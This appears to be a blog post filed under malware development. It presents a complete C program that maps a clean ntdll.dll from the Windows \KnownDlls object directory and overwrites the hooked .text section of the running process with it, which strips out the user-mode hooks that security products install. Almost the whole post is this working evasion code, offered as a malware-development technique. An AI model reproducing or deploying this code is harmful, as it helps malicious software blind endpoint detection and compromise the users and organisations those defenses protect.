---
title: "Unhooking NTDLL - Knowndlls"
date: 2026-06-27 00:00:00 +0100
categories: [Malware, Development]
tags:
  - malware
  - development
---

# Unhooking NTDLL - Knowndlls


## ntdll-knowndlls.c

```c
/*
	Windows maintains a special object directory named "\KnownDlls"
	that contains section objects for a set of commonly used system DLLs.

	Processes can map these section objects directly instead of loading
	the DLL from disk, allowing multiple processes to share the same
	physical memory pages for these modules.
*/

#include <Windows.h>
#include <stdio.h>
#include <winternl.h>

// KnownDlls path for ntdll (Unicode string literal)
#define NTDLL	L"\\KnownDlls\\ntdll.dll"
#define ERR(WinAPI) printf("[!] %s Failed With Error : %d \n", WinAPI, GetLastError())


// OpenFileMappingW is not working, for that reason we are using NtOpenSection instead
// Function pointer typedef for NtOpenSection
typedef NTSTATUS(NTAPI* fnNtOpenSection) (
	PHANDLE		SectionHandle,
	ACCESS_MASK	DesiredAccess,
	POBJECT_ATTRIBUTES ObjectAttributes		// Pointer to OBJECT_ATTRIBUTES struct, specifies the object name.
);

BOOL MapNtdllKnownDlls(_Out_ PVOID* ppNtdlAddr) {
	
	HANDLE hSection					= NULL;
	PBYTE pNtdllAddr					= NULL;
	NTSTATUS	STATUS				= NULL;
	UNICODE_STRING	UniString		= { 0 };
	OBJECT_ATTRIBUTES ObjAttributes = { 0 };


	// Construct unicode string that will hold \KnownDlls\ntdll.dll
	UniString.Buffer = (PWSTR)NTDLL;
	UniString.Length = wcslen(NTDLL) * sizeof(WCHAR);		// Determine size in bytes
	UniString.MaximumLength = UniString.Length + sizeof(WCHAR);

	// Init ObjAttributes with UniString
	// OBJ_CASE_INSENSITIVE ensures the lookup works regardless of case
	InitializeObjectAttributes(&ObjAttributes, &UniString, OBJ_CASE_INSENSITIVE, NULL, NULL);


	// Resolve NtOpenSection dynamically
	fnNtOpenSection pNtOpenSection = (fnNtOpenSection)GetProcAddress(GetModuleHandle(L"NTDLL"), "NtOpenSection");

	// Get handle from known dlls
	STATUS = pNtOpenSection(&hSection, SECTION_MAP_READ, &ObjAttributes);
	if (STATUS != 0x00) {
		ERR("NtOpenSection");
		goto _End;
	}
	
	// Map ntdll into memory
	pNtdllAddr = MapViewOfFile(hSection, FILE_MAP_READ, NULL, NULL, NULL);
	if (!pNtdllAddr) {
		ERR("MapViewOfFile");
		goto _End;
	}

	// Casting out
	*ppNtdlAddr = pNtdllAddr;

_End:
	if (hSection)
		CloseHandle(hSection);
	if (*ppNtdlAddr == NULL)
		return FALSE;
	else
		return TRUE;
}



PVOID FetchLocalNtdllBaseAddress() {

#ifdef _WIN64
	PPEB pPeb = (PPEB)__readgsqword(0x60);
#elif _WIN32
	PPEB pPeb = (PPEB)__readfsdword(0x30);
#endif // _WIN64

	// Reaching to the 'ntdll.dll' module directly (we know its the 2nd image after 'DiskHooking.exe')
	// 0x10 is = sizeof(LIST_ENTRY)
	PLDR_DATA_TABLE_ENTRY pLdr = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pPeb->Ldr->InMemoryOrderModuleList.Flink->Flink - 0x10);

	return pLdr->DllBase;
}



BOOL ReplaceNtdllTxtSection(_In_ PVOID pUnhookedNtdll) {

	PVOID				pLocalNtdll = (PVOID)FetchLocalNtdllBaseAddress();

	printf("[+] 'Hooked' Ntdll Base Address : 0x%p \n\t[i] 'Unhooked' Ntdll Base Address : 0x%p \n", pLocalNtdll, pUnhookedNtdll);
	printf("[#] Press <Enter> To Continue ... ");
	getchar();

	// getting the dos header
	PIMAGE_DOS_HEADER	pLocalDosHdr = (PIMAGE_DOS_HEADER)pLocalNtdll;
	if (pLocalDosHdr && pLocalDosHdr->e_magic != IMAGE_DOS_SIGNATURE)
		return FALSE;

	// getting the nt headers
	PIMAGE_NT_HEADERS pLocalNtHdrs = (PIMAGE_NT_HEADERS)((PBYTE)pLocalNtdll + pLocalDosHdr->e_lfanew);
	if (pLocalNtHdrs->Signature != IMAGE_NT_SIGNATURE)
		return FALSE;


	PVOID		pLocalNtdllTxt = NULL,	// local hooked text section base address
		pRemoteNtdllTxt = NULL; // the unhooked text section base address
	SIZE_T		sNtdllTxtSize = NULL;	// the size of the text section



	// getting the text section
	PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pLocalNtHdrs);

	for (int i = 0; i < pLocalNtHdrs->FileHeader.NumberOfSections; i++) {

		// the same as if( strcmp(pSectionHeader[i].Name, ".text") == 0 )
		if ((*(ULONG*)pSectionHeader[i].Name | 0x20202020) == 'xet.') {
			pLocalNtdllTxt = (PVOID)((ULONG_PTR)pLocalNtdll + pSectionHeader[i].VirtualAddress);
			pRemoteNtdllTxt = (PVOID)((ULONG_PTR)pUnhookedNtdll + pSectionHeader[i].VirtualAddress);
			sNtdllTxtSize = pSectionHeader[i].Misc.VirtualSize;
			break;
		}
	}

	//---------------------------------------------------------------------------------------------------------------------------

	printf("[+] 'Hooked' Ntdll Text Section Address : 0x%p \n\t[i] 'Unhooked' Ntdll Text Section Address : 0x%p \n\t[i] Text Section Size : %d \n", pLocalNtdllTxt, pRemoteNtdllTxt, sNtdllTxtSize);
	printf("[#] Press <Enter> To Continue ... ");
	getchar();

	// small check to verify that all the required information is retrieved
	if (!pLocalNtdllTxt || !pRemoteNtdllTxt || !sNtdllTxtSize)
		return FALSE;

	// small check to verify that 'pRemoteNtdllTxt' is really the base address of the text section
	if (*(ULONG*)pLocalNtdllTxt != *(ULONG*)pRemoteNtdllTxt)
		return FALSE;

	//---------------------------------------------------------------------------------------------------------------------------

	printf("[i] Replacing The Text Section ... ");
	DWORD dwOldProtection = NULL;

	// making the text section writable and executable
	if (!VirtualProtect(pLocalNtdllTxt, sNtdllTxtSize, PAGE_EXECUTE_WRITECOPY, &dwOldProtection)) {
		printf("[!] VirtualProtect [1] Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// copying the new text section 
	memcpy(pLocalNtdllTxt, pRemoteNtdllTxt, sNtdllTxtSize);

	// rrestoring the old memory protection
	if (!VirtualProtect(pLocalNtdllTxt, sNtdllTxtSize, dwOldProtection, &dwOldProtection)) {
		printf("[!] VirtualProtect [2] Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	printf("[+] DONE !\n");

	return TRUE;
}

int main() {
	
	PVOID pNtdll = NULL;

	printf("[+] Retrieve A New \"ntdll.dll\" File from \"\\KnownDlls\\\" \n");

	if (!MapNtdllKnownDlls(&pNtdll))
		return -1;

	if (!ReplaceNtdllTxtSection(pNtdll))
		return -1;

	UnmapViewOfFile(pNtdll);

	printf("[+] Ntdll Unhooked Successfully \n");

	printf("[#] Press <Enter> To Quit ... ");
	getchar();

	return 0;
}
```

